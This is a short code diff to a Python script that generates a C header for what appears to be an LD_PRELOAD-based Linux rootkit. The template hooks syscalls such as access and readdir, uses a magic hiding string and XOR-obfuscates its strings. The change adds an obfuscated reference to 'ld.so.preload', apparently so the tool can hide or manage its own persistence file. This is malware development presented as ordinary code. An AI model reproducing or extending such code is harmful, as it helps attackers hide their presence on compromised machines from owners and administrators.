@@ -22,6 +22,7 @@ header_template = '''#define _GNU_SOURCE
 #endif
 
 #define MAGIC_STRING\t"{magic_string}"
+#define CONFIG_FILE\t"{config_file}"
 
 #define SYS_ACCESS 0
 #define SYS_READDIR 1
@@ -60,6 +61,7 @@ syscalls = [
 
 header = header_template.format(
     magic_string="__",
+    config_file=xor("ld.so.preload"),
 )
 
 # XOR the syscall names and format them into a list
